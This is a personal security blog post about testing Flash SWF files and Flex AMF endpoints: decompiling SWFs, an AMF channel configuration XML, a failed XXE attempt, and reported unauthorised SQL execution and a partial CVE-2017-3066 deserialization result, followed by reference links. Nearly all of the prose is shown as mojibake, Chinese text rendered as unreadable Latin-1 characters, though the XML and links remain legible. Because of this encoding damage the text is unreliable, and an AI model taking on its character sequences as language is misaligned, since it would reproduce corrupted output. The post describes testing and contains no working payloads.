å…·ä½“çš„ç ”ç©¶ç»“æžœå°±ä½“çŽ°åœ¨ä¸Šé¢çš„æ–‡ç« ä¸­äº†ï¼Œåªä¸è¿‡å½“æ—¶æ—¶é—´æœ‰é™ï¼Œäº†è§£çš„æ²¡æ–‡ç« ä¸­é‚£ä¹ˆå…·ä½“ï¼Œä¹Ÿè¸©äº†å¾ˆå¤šå‘ã€‚

æˆ‘æ‰¹é‡ä¸‹è½½äº†SWFæ–‡ä»¶ï¼Œå¹¶é€šè¿‡ ffdec è¿›è¡Œäº†åç¼–è¯‘ï¼Œä¹‹åŽå°†æ•°æ®å…¨éƒ¨å¤åˆ¶åˆ°ä¸€ä¸ªç›®å½•ä¸­ã€‚

æŽ¥ä¸‹åŽ»è€ƒè™‘æ˜¯å¦åƒçœ‹è¿‡çš„å¾ˆå¤šæ–‡ç« ä¸€æ ·åŽ»æŒ–XSSï¼Œä½†æ˜¯æˆ‘æ”¾å¼ƒäº†ï¼Œå› ä¸ºå¤ªè´¹æ—¶è´¹åŠ›äº†ï¼Œæ—¶é—´ä¸å¤Ÿï¼Œå¯¹ actionScriptåˆä¸äº†è§£ï¼Œæ”¾å¼ƒäº†è¿™æ¡è·¯ã€‚

ä¹‹åŽæˆ‘å¯¹è¿™äº›SWFæ–‡ä»¶è¿›è¡Œæ•æ„Ÿæ•°æ®æŒ–æŽ˜ï¼Œè¯´ç™½äº†å°±æ˜¯ç”¨è‡ªå·±çš„å·¥å…·æ‰«äº†éæ–‡ä»¶ï¼ŒæœŸæœ›æ‰¾åˆ°äº›æ•æ„Ÿä¿¡æ¯ï¼Œå¯æƒœæ²¡è¾¾åˆ°é¢„æœŸã€‚

æ²¡æ‰¾åˆ°å¾ˆæ»¡æ„çš„æ•æ„Ÿä¿¡æ¯ï¼Œåœ¨ä¸€ä¸ªasæ–‡ä»¶ä¸­æ‰¾åˆ°äº†å‡ ä¸ªæŽ¥å£

```xml
	&lt;channels&gt;
		&lt;channel id=&#34;my-http&#34; type=&#34;mx.messaging.channels.HTTPChannel&#34;&gt;
			&lt;endpoint uri=&#34;http://{server.name}:{server.port}/AtomLocal/messagebroker/http&#34;/&gt;
			&lt;properties&gt;
			&lt;/properties&gt;
		&lt;/channel&gt;
		&lt;channel id=&#34;my-polling-amf&#34; type=&#34;mx.messaging.channels.AMFChannel&#34;&gt;
			&lt;endpoint uri=&#34;http://{server.name}:{server.port}/AtomLocal/messagebroker/amfpolling&#34;/&gt;
			&lt;properties&gt;
				&lt;polling-enabled&gt;true&lt;/polling-enabled&gt;
				&lt;polling-interval-seconds&gt;1&lt;/polling-interval-seconds&gt;
			&lt;/properties&gt;
		&lt;/channel&gt;
		&lt;channel id=&#34;my-amf&#34; type=&#34;mx.messaging.channels.AMFChannel&#34;&gt;
			&lt;endpoint uri=&#34;http://{server.name}:{server.port}/AtomLocal/messagebroker/amf&#34;/&gt;
			&lt;properties&gt;
				&lt;polling-enabled&gt;false&lt;/polling-enabled&gt;
			&lt;/properties&gt;
		&lt;/channel&gt;
		&lt;channel id=&#34;my-streaming-amf&#34; type=&#34;mx.messaging.channels.StreamingAMFChannel&#34;&gt;
			&lt;endpoint uri=&#34;http://{server.name}:{server.port}/AtomLocal/messagebroker/streamingamf&#34;/&gt;
			&lt;properties&gt;
			&lt;/properties&gt;
		&lt;/channel&gt;
```

å…¶ä»–å‡ ä¸ªéƒ½æ˜¯è·Ÿamfæœ‰å…³çš„ï¼Œä¸€ä¸ªè·Ÿhttpç›¸å…³çš„æŽ¥å£ã€‚

&gt; è¿™å…¶å®žæ˜¯ä¸€ä¸ª  Flex æ¡†æž¶ä¸­ç”¨äºŽé…ç½®æ¶ˆæ¯ä¼ é€’é€šé“çš„ æœåŠ¡é…ç½® XMLï¼Œå®ƒå®šä¹‰äº†ä¸€ä¸ª AMFï¼ˆAction Message Formatï¼‰åè®®çš„é€šä¿¡é€šé“ï¼Œç”¨äºŽ Flex å®¢æˆ·ç«¯ä¸ŽæœåŠ¡å™¨ä¹‹é—´çš„è¿œç¨‹æ•°æ®äº¤äº’ã€‚

å½“æ—¶æ²¡ç ”ç©¶é‚£ä¹ˆå¤šï¼Œå°±å¯¹HTTPæŽ¥å£è¿›è¡Œæµ‹è¯•ï¼ŒæœåŠ¡ç«¯è¿”å›žäº†æŠ¥é”™çš„xmlã€‚

å°è¯•æž„é€ xmlï¼Œxxeè¿›è¡Œæ”»å‡»HTTPæŽ¥å£ï¼Œæœ€ç»ˆå¤±è´¥äº†ï¼Œæ²¡æ”¶èŽ·ã€‚

äº‹åŽæŸ¥äº†ä¸€ä¸‹ï¼Œè¿™å…¶å®žæ˜¯ Flexæ¡†æž¶çš„é…ç½®æ–‡ä»¶ï¼Œå…·ä½“è§£é‡Šå¦‚ä¸‹ï¼š

&gt; 1. **`&lt;channel id=&#34;my-amf&#34; type=&#34;mx.messaging.channels.AMFChannel&#34;&gt;`**
&gt;    - `id=&#34;my-amf&#34;`ï¼šç»™é€šé“å®šä¹‰å”¯ä¸€æ ‡è¯†ï¼ˆ`my-amf`ï¼‰ï¼Œæ–¹ä¾¿åœ¨ Flex å®¢æˆ·ç«¯ä»£ç ä¸­å¼•ç”¨ï¼ˆå¦‚æŒ‡å®šè¿œç¨‹è°ƒç”¨ä½¿ç”¨è¯¥é€šé“ï¼‰ã€‚
&gt;    - `type=&#34;mx.messaging.channels.AMFChannel&#34;`ï¼šæŒ‡å®šé€šé“ç±»åž‹ä¸º`AMFChannel`ï¼Œè¿™æ˜¯ Flex ä¸­åŸºäºŽ AMF åè®®çš„é€šä¿¡é€šé“ç±»ï¼Œç”¨äºŽé«˜æ•ˆåºåˆ—åŒ– / ååºåˆ—åŒ– ActionScript å¯¹è±¡ä¸ŽæœåŠ¡å™¨ç«¯æ•°æ®ï¼ˆé€šå¸¸å¯¹åº” Java çš„ BlazeDS æˆ– LCDS æ¡†æž¶ï¼‰ã€‚
&gt; 2. **`&lt;endpoint uri=&#34;http://{server.name}:{server.port}/AtomLocal/messagebroker/amf&#34;/&gt;`**
&gt;    - å®šä¹‰æœåŠ¡å™¨ç«¯çš„æ¶ˆæ¯ä»£ç†ï¼ˆMessage Brokerï¼‰ç«¯ç‚¹ URLï¼ŒFlex å®¢æˆ·ç«¯å°†é€šè¿‡è¿™ä¸ª URL ä¸ŽæœåŠ¡å™¨å»ºç«‹é€šä¿¡ã€‚
&gt;    - `{server.name}`å’Œ`{server.port}`æ˜¯å ä½ç¬¦ï¼Œè¿è¡Œæ—¶ä¼šè¢«æ›¿æ¢ä¸ºå®žé™…çš„æœåŠ¡å™¨åŸŸå / IP å’Œç«¯å£ã€‚
&gt;    - `/AtomLocal/messagebroker/amf`æ˜¯æœåŠ¡å™¨ç«¯æ¶ˆæ¯ä»£ç†çš„è·¯å¾„ï¼Œå¯¹åº” BlazeDS/LCDS æ¡†æž¶ä¸­å¤„ç† AMF è¯·æ±‚çš„ Servlet æ˜ å°„ã€‚
&gt; 3. **`&lt;properties&gt;&lt;polling-enabled&gt;false&lt;/polling-enabled&gt;&lt;/properties&gt;`**
&gt;    - `properties` ä¸ºé…ç½®é€šé“çš„é™„åŠ å±žæ€§ï¼š
&gt;    - `polling-enabled`è®¾ä¸º`false`ï¼Œè¡¨ç¤ºç¦ç”¨å®¢æˆ·ç«¯ä¸»åŠ¨è½®è¯¢ï¼ˆPollingï¼‰æœºåˆ¶ã€‚AMFChannel é»˜è®¤æ”¯æŒ â€œé•¿è½®è¯¢â€ æˆ– â€œå®žæ—¶æŽ¨é€â€ï¼Œç¦ç”¨åŽé€šå¸¸ä¾èµ–æœåŠ¡å™¨ä¸»åŠ¨æŽ¨é€ï¼ˆå¦‚ä½¿ç”¨ RTMP é€šé“ï¼‰æˆ–å®¢æˆ·ç«¯æŒ‰éœ€å‘èµ·è¯·æ±‚ã€‚



### AMF

æŽ¥ä¸‹åŽ»ç ”ç©¶ amf æŽ¥å£

æœ€ç»ˆç”¨äº†ä¸Šæ–‡æåˆ°çš„é‚£å‡ æ¬¾å·¥å…·ï¼Œå› ä¸ºæ²¡è¾¾åˆ°é¢„æœŸæ•ˆæžœï¼Œæ€»æ˜¯ä¼šæœ‰è§£ç ä¸äº†çš„åœºæ™¯ï¼Œå› æ­¤è¿™å‡ æ¬¾å·¥å…·æˆ‘éƒ½è¯•äº†ï¼Œæœ€åŽç”±äºŽæ—¶é—´ç´§è¿«ï¼Œå°†å°±ç”¨äº†ã€‚

æˆåŠŸå¯¹ AMF æŽ¥å£åºåˆ—åŒ–æ•°æ®è¿›è¡Œè§£ç åŽï¼Œæˆ‘å‘çŽ°äº† æœªæŽˆæƒæ‰§è¡Œä»»æ„SQLè¯­å¥ã€ååºåˆ—åŒ– æ¼æ´žï¼Œä¸è¿‡CVE-2017-3066çš„ååºåˆ—åŒ–æœ€ç»ˆæ²¡æœ‰æ‰“æˆåŠŸï¼Œæ”¶åˆ°RMIå›žè¿žäº†ï¼Œä½†æ˜¯æ²¡æ‰§è¡Œå‘½ä»¤ã€‚å› ä¸ºæ—¶é—´å…³ç³»ä¹Ÿæ²¡æ³•ç»§ç»­ç ”ç©¶äº†ã€‚

### äº‹åŽ

äº‹åŽæˆ‘æ€»ç»“äº†è¿™æ¬¡æµ‹è¯•è®°å½•ï¼Œå½¢æˆäº†è¿™ç¯‡æ–‡ç« ã€‚

åœ¨æ•´ç†çš„è¿‡ç¨‹ä¸­ï¼Œåˆé˜…è¯»äº†å¾ˆå¤šæ–‡ç« ï¼Œå¯¹ç›¸å…³å†…å®¹æœ‰äº†æ›´å¤šçš„äº†è§£ã€‚

å¯¹è¿™æ¬¡æ²¡èƒ½æµ‹è¯•åˆ°çš„å¾ˆå¤šæ¼æ´žï¼Œæ„Ÿè§‰æœ‰ç‚¹é—æ†¾ã€‚

è¿™ç¯‡æ–‡ç« å…¶å®žä¹Ÿå†™çš„æ¯”è¾ƒåŒ†å¿™ï¼Œå› ä¸ºä¸æƒ³ä¸ºè¿™ä¸ªè¿‡æ—¶çš„æŠ€æœ¯èŠ±è´¹å¤ªå¤šæ—¶é—´ï¼Œæ„Ÿè§‰æ€§ä»·æ¯”è¾ƒä½Žï¼Œä½†æœ‰æ—¶åˆåœ¨æƒ³æ˜¯ä¸æ˜¯åº”è¯¥å†æ·±å…¥ä¸€ä¸‹ï¼Œæ€»æ˜¯ä¼šçº ç»“ã€‚

åŒ†åŒ†å¿™å¿™ï¼Œæ€»åœ¨è·Ÿæ—¶é—´èµ›è·‘ï¼Œå¥½åƒè¢«ä»€ä¹ˆä¸œè¥¿è¿½èµ¶ç€ï¼Œæˆ‘è¿˜æœ‰ä¸€å¤§å †çš„ToDo Listï¼Œäººè¯´é€‰æ‹©å¾ˆé‡è¦ï¼Œè¦å­¦ä¼šæ‹¿èµ·æ›´è¦å­¦ä¼šæ”¾ä¸‹ï¼Œå°±è¿™æ ·å§ï¼Œä¸å¤šè¯´äº†ã€‚

------

ä¹Ÿè®¸è¿˜æ²¡å®Œï¼Œæˆ‘åˆšåˆ·åˆ°ä¸€ç¯‡æ–‡ç« ï¼Œæ˜¯ä¸€ä¸ª2024å¹´ï¼Œè¾ƒæ–°æ¼æ´žçš„åˆ†æžï¼š

- [SolarWinds Security Event Manager AMF ååºåˆ—åŒ– RCE (CVE-2024-0692)](https://xz.aliyun.com/news/13481)

åŽç»­å¯èƒ½å°±ä¸æ˜¯é’ˆå¯¹Flashæµ‹è¯•çš„æ–‡ç« ï¼Œä¼šé’ˆå¯¹ AMF ååºåˆ—åŒ–è¿™ç³»åˆ—æ¼æ´žè¿›è¡Œåˆ†æžå­¦ä¹ ã€‚ï¼ˆ*åˆæ˜¯æ–°å‘ï¼ŒToDoListåˆå¢žåŠ äº†ã€‚ã€‚ã€‚å’•å’•å’•ðŸ•Š*ï¼‰

æœ‰å…´è¶£çš„æœ‹å‹ä¹Ÿå¯ä»¥ä¸€èµ·ç ”ç©¶ä¸‹ï¼Œæˆ‘ç»™ä¸€äº›å‚è€ƒæ–‡ç« ï¼š

- [æµ…è¯´AMFååºåˆ—åŒ–åŠåˆ©ç”¨é“¾æž„é€ ](https://cn-sec.com/archives/2323918.html)
- [Java AMF3ååºåˆ—åŒ–æ¼æ´ž](https://www.liuhaihua.cn/archives/642555.html)



## å‚è€ƒæ–‡çŒ®
- [å…¨é¢è®¤è¯†FlashæŠ€æœ¯](https://developer.aliyun.com/article/408379)
- [æŽ¢å¯»Flash SWFä¸­çš„æ¼æ´ž](https://xz.aliyun.com/news/3051) å…ˆçŸ¥ï¼Œç¿»è¯‘ï¼ŒåŽŸæ–‡ï¼šhttp://10degres.net/testing-flash-swf/
- [Analysing SWF files for vulnerabilities](https://ret2libc.wordpress.com/2016/04/04/analysing-swf-files-for-vulnerabilities/)
- [Finding vulnerabilities in SWF files (v2.0)](http://media.wix.com/ugd/533dd4_c096c1fa67814318acb84d41a04fb258.pdf)
- [ä¸€æ¬¡ SWF XSS æŒ–æŽ˜å’Œåˆ©ç”¨](https://cn-sec.com/archives/321701.html)ï¼Œ ä¹Œäº‘ drops
- [æµ…æžåŒæºæ–¹å¼æ‰§è¡Œï¼ˆSOMEï¼‰æ”»å‡»](https://www.freebuf.com/articles/web/169873.html)
- [Actionscript 3.0 â€“ Flash Security Sandbox](https://www.designswan.com/archives/actionscript-30-flashs-security-sandbox.html)ï¼š è‹±æ–‡åŽŸæ–‡
- [Testing for Cross Site Flashing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing)  
- [Analysing SWF files for vulnerabilities](https://ret2libc.wordpress.com/2016/04/04/analysing-swf-files-for-vulnerabilities/)
- [è°ˆè°ˆAMFç½‘ç«™çš„æ¸—é€æµ‹è¯•](https://xz.aliyun.com/news/7994)
- [CVE-2017-3066: Adobe ColdFusion Deserialization Vulnerability](https://www.keysight.com/blogs/en/tech/nwvs/2025/03/18/cve-2017-3066)
## æ–‡ä»¶å±žæ€§

åˆ›å»ºæ—¶é—´ï¼š2025-08-16   13:33

ä¿®è®¢è®°å½•ï¼š
- 2025-08-16 ï¼Œæ­¤æ¬¡ä¿®è®¢å†…å®¹| æ–°å»º
- 2025-08-19 ï¼Œæ­¤æ¬¡ä¿®è®¢å†…å®¹| å®Œæˆ1.0ç‰ˆ
- 2025-08-25 ï¼Œè¡¥å……swfscanå·¥å…·å’Œæˆªå›¾| å®Œæˆ2.0ç‰ˆ

å¤‡æ³¨ï¼š
è€æŠ€æœ¯ï¼Œæ”¶è—å¤¹åƒç°å°±è¡Œ

---

> ä½œè€…: Xavier  
> URL: https://www.bthoughts.top/posts/case-flash_swf_amf_test/  

